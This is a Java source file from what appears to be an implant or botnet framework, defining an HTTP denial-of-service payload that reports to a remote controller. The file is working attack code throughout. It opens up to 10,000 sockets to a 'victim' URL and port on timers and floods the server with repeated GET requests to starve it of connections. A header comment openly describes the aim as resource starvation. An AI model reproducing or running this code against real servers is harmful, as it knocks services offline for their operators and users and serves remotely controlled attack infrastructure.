/**
 * Introducing DOS_Bot
 * 
 * DOS'ing a system can be accomplished in many ways.
 * But first, let's define DOS'ing from the developer's point of view. 
 * Although DOS is denying availability of a service to entities, from my view, this definition is simply
 * an observed or measured affect of the DOS.  in actuality, I see DOS'ing as RESOURCE STARVATION. 
 * 
 * now, resource starvation can be accomplished in many ways: sending fragmented packets, SYN half-open packets, 
 * etc.  
 * 
 * This DOS_Bot will accomplish resource starvation by opening as many sockets to the specified URL and repeatedly
 * making HTTP Get requests... eventually the server will be starved of available sockets that it can handle
 * and then new sockets will be rejected until resources are freed by the HTTP err... when the DOS stops!
 * 
 * 
 * 
 * @author Solomon Sonya
 */


package Implant.Payloads.DOS_Bot.HTTP_DOS_Bot;

import java.awt.event.ActionListener;
import java.io.*;
import java.net.*;
import javax.net.ssl.*;
import javax.net.*;
import java.awt.event.*;
import Implant.Driver;
import Implant.Splinter_IMPLANT;
import java.util.*;

import javax.swing.Timer;

public class DOS_Bot_WEB extends Thread implements Runnable, ActionListener
{
	public static final String myClassName = "DOS_Bot_WEB";
	public static volatile boolean run_DOS_Bot = false;
	
	public volatile String victimURL = "";
	public volatile int victimPort = 80;
	
	public volatile static int maxSockets = 10000;
	
	public volatile int millisecInterruptDelayInterval = 100;
	public volatile Timer tmrInterrupt = null;
	public volatile Timer tmrInterrupt_FUZZ = null;
	public volatile boolean handleInterrupt = false;
	
	public volatile int millisecInterruptDelayInterval_FUZZ = 1000;
	public volatile boolean handleInterrupt_FUZZ = false;
	public volatile boolean success = true;
	public volatile HTTP_Object node = null;
	
	public Splinter_IMPLANT implant = null;
	
	public final String HDR_USER_AGENT = "Mozilla/5.0";
	public final String HDR_CONNECTION = "keep-alive";//"Connection: keep-alive";
	public final String HDR_ACCEPT = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";//"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
	public final String HDR_ENCODING = "gzip,deflate,sdch"; //"Accept-Encoding: gzip,deflate,sdch";
	public final String HDR_LANGUAGE = "en-US,en;q=0.8";//"Accept-Language: en-US,en;q=0.8";		
	
	public volatile String request = "GET / HTTP/1.1";
	
	//public volatile LinkedList<HttpURLConnection> queHTTP_Sockets = new LinkedList<HttpURLConnection>();
	public volatile LinkedList<HTTP_Object> queHTTP_Sockets = new LinkedList<HTTP_Object>();
	
	HTTP_Object DOS_Bot_Object  = null;
	
	URL url = null;
	HttpURLConnection http_connection = null;
	
	public DOS_Bot_WEB(String victimNet, int victimPrt, Splinter_IMPLANT parent)
	{
		try
		{
			implant = parent;
			victimURL = victimNet;
			
			victimPort = victimPrt;
			
			if(victimPort < 1 || victimPort > 65534)
			{
				Driver.sop("Victim port [" + victimPort + "] is out of range, defaulting to port 80");
				this.sendToController("Victim port [" + victimPort + "] is out of range, defaulting to port 80");
				victimPort = 80;
			}
			
			/*if(victimURL != null && !victimURL.toLowerCase().startsWith("http://"))
			{
				victimURL = "http://" + victimURL;
			}*/
			
			this.start();
			
		}
		catch(Exception e)
		{
			Driver.eop("Constructor", myClassName, e, "", false);
		}
	}
	
	public void run()
	{
		try
		{
			run_DOS_Bot = true;
			
			//reset timer
			try
			{
				HTTP_Object.informedControllerOfDOS = false;
				HTTP_Object.informedSOP_Of_DOS = false;
			}
			catch(Exception e){}
			
			//start timer thread. interrupt will be used to interate through queue
			//proceed in the following manner:
			//wake: check if queue is at max capacity, if not, instantiate new socket to victim
			//fall through to process all sockets in queue, for each socket, send get request, empty queue
			//repeat until end of queue, release semaphore, go back to sleep until next interrupt
			Driver.sop("Commencing Orbiter HTTP_DOS_Bot now... Victim Net: " + victimURL + " : " + victimPort);
			this.sendToController("Commencing Orbiter HTTP_DOS_Bot now... Victim Net: " + victimURL + " : " + victimPort);
			
			handleInterrupt = false;
			this.tmrInterrupt = new Timer(this.millisecInterruptDelayInterval, this);
			tmrInterrupt.start();
			handleInterrupt = true;
			
			//start the fuzzer interrupt. so thus, we have 2 interrupt timers, one to instantiate new sockets, and the other to check already established sockets, and make random requests
			handleInterrupt_FUZZ = false;
			this.tmrInterrupt_FUZZ = new Timer(this.millisecInterruptDelayInterval_FUZZ , this);
			tmrInterrupt_FUZZ.start();
			handleInterrupt_FUZZ = true;
			
			
		}
		catch(Exception e)
		{
			Driver.eop("run", myClassName, e, "", false);
		}
	}
	
	public boolean HALT_DOS()
	{
		try
		{
			Driver.sop("HTTP_DOS_Bot kill command received! terminating DOS orbiters...");
			sendToController("HTTP_DOS_Bot kill command received! terminating DOS orbiters...");
			
			this.tmrInterrupt.stop();
			this.tmrInterrupt_FUZZ.stop();
			this.queHTTP_Sockets.clear();
			
			this.run_DOS_Bot = false;
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("HALT_DOS", myClassName, e, "", false);
		}
		
		return false;
		
	}
	
	public void actionPerformed(ActionEvent ae)
	{
		try
		{
			if(ae.getSource() == this.tmrInterrupt)
			{
				if(!run_DOS_Bot)
				{
					Driver.sop("HTTP_DOS_Bot kill command received! halting DOS orbiters...");
					sendToController("HTTP_DOS_Bot kill command received! halting DOS orbiters...");
					
					try
					{
						this.tmrInterrupt.stop();
						this.tmrInterrupt_FUZZ.stop();
						this.queHTTP_Sockets.clear();
					}catch(Exception e){}
				}
				
				if(handleInterrupt)
				{
					processInterrupt();
				}
			}
			
			else if(ae.getSource() == this.tmrInterrupt_FUZZ)
			{
				if(handleInterrupt_FUZZ)
				{
					processInterrupt_FUZZ();
				}
			}
			
			
		}
		catch(Exception e)
		{
			Driver.eop("ae", myClassName, e, "", false);
		}
	}
	
	public boolean processInterrupt()
	{
		try
		{
			
			
			handleInterrupt = false;
			
			//ensure queue is ok
			if(queHTTP_Sockets == null)
			{
				queHTTP_Sockets = new LinkedList<HTTP_Object>();
			}
			
			//check if we have instantiated the max number of http sockets
			if(queHTTP_Sockets != null && queHTTP_Sockets.size() < this.maxSockets)
			{
				//instantiate new HTTP Socket
				instantiate_HTTP_Socket_GET();
			}
			
			//next, iterate through queue to send random chunks of data
			/*for(int i = 0; i < this.queHTTP_Sockets.size(); i++)
			{
				this.queHTTP_Sockets.get(i).sendRequest("SOLOMON SONYA " + Driver.getTimeStamp_Updated());
			}*/
			
			//Driver.jop("BACK");
			
			handleInterrupt = true;
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("processInterrupt", myClassName, e, "", false);
		}
		
		handleInterrupt = true;
		return false;
	}
	
	public boolean instantiate_HTTP_Socket_GET()
	{
		try
		{
			DOS_Bot_Object = new HTTP_Object(this.victimURL, victimPort, this.implant);
			this.queHTTP_Sockets.addLast(DOS_Bot_Object);
			
			
			//Driver.sop("size: " + queHTTP_Sockets.size());
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("instantiate_HTTP_Socket_GET", myClassName, e, "", false);
		}
		
		return false;
	}
	
	//this mtd simply interates through established sockets to fuzz the victim server
	public boolean processInterrupt_FUZZ()
	{
		try
		{
			handleInterrupt_FUZZ = false;
			
			for(int i = 0; queHTTP_Sockets != null && i < this.queHTTP_Sockets.size(); i++)
			{
				//queHTTP_Sockets.get(i).sendFuzz(""+Math.random() * 300 + ".jpg");//this will kill the connection for invalid requests, instead, send valid get requests over and over and over again
				success = queHTTP_Sockets.get(i).sendInitialGetCommand();
				
				if(!success)
				{
					//socket encountered an error, remove it!
					//node = queHTTP_Sockets.get(i);
					node = queHTTP_Sockets.remove(i);
					
					//remove the node
					if(node != null)
					{
						try
						{
							node.pwOut.close();
						}catch(Exception e){}
						
						try
						{
							node.mySocket.close();
						}catch(Exception e){}
						
						node = null;
					}
				}
			}
			
			handleInterrupt_FUZZ = true;
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("processInterrupt_FUZZ", myClassName, e, "", false);
		}
		
		handleInterrupt_FUZZ = true;
		
		return false;
	}
	
	public boolean OLD_instantiate_HTTP_Socket_GET() 
	{
		try
		{
			//
			//INIT
			//
			url = new URL(this.victimURL);
		    http_connection = (HttpURLConnection)url.openConnection();
		    
		    //
		    //URL TYPE: GET/POST
		    //
		    http_connection.setRequestMethod("GET");
		    
		    
		    //
		    //HEADERS
		    //
		    http_connection.setConnectTimeout(0);//specify infinite wait if possible
		    http_connection.setFollowRedirects(true);
		    http_connection.setDoInput(true);
		    http_connection.setDoOutput(true);
		    http_connection.setDefaultUseCaches(false);
		    
		   
		    //Connection: keep-alive
		    http_connection.setRequestProperty("Connection", "keep-alive");
		    
		    //Accept: 
		    http_connection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
		    
		    //User-Agent: Mozilla/5.0
		    http_connection.setRequestProperty("User-Agent", "Mozilla/5.0");
		    
		    //Accept-Encoding: gzip,deflate,sdch
		    //http_connection.setRequestProperty("Accept-Encoding", "gzip,deflate,sdch");
		    
		    //Accept-Language: en-US,en;q=0.8
		    http_connection.setRequestProperty("Accept-Language", "en-US,en;q=0.8");
		    
		  		    
		    
		    //
		    //EXECUTE COMMAND
		    //
		    int responseCode = http_connection.getResponseCode();
		    
		    //
		    //results
		    //
		    ///System.out.println("\nSending GET request to victim: " + url);
			///System.out.println("Received resposne code: " + responseCode);
			
		    
			
			
			//
			//page data
			//
			
			///BufferedReader brIn = new BufferedReader(new InputStreamReader(http_connection.getInputStream()));
			
			StringBuffer lineBuffer = new StringBuffer();
			String line = "";
			
			//note, browsers know to make additional requests because of presesence of the following:
			// <script src="/minify/popunder-min-4092290603.js?v=release-2014-04-r5-4853-1028553-1"></script><!-- 0 ms -->

			//	<script src="/minify/intentmedia-min-388305251.js?v=release-2014-04-r5-4853-1028553-1"></script><!-- 0 ms -->

			//	<script src="/minify/external.yui.bundle.min-min-3188398238.js?v=release-2014-04-r5-4853-1028553-2"></script><!-- 0 ms -->


			//so far, if we see a like that starts with a "<", and contains "</" for the beginning and end of script and then has "src=", then we have grounds of how to make a new request!!!
			//	I am leaving this funciton off for now, and will just have bogus GET requests
			
			
			///while ((line = brIn.readLine()) != null) 
			///{
			///	lineBuffer.append(line + "\n");
				//lineBuffer.append('\r');				
			///}
	 
			///System.out.println(lineBuffer.toString());
			
			//brIn.close();
			
			//created new socket, add to the queue
			///this.queHTTP_Sockets.add(http_connection);
			
			
			
			//return true;
			
			
		}
		catch(Exception e)
		{
			Driver.eop("instantiate_HTTP_Socket", myClassName, e, "", false);
		}
		
		return false;
	}
	
	public boolean sendToController(String strToSend)
	{
		try
		{
			if(implant != null)
			{
				implant.sendToController(strToSend, false, false);				
			}						
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("sendToController", myClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}

}
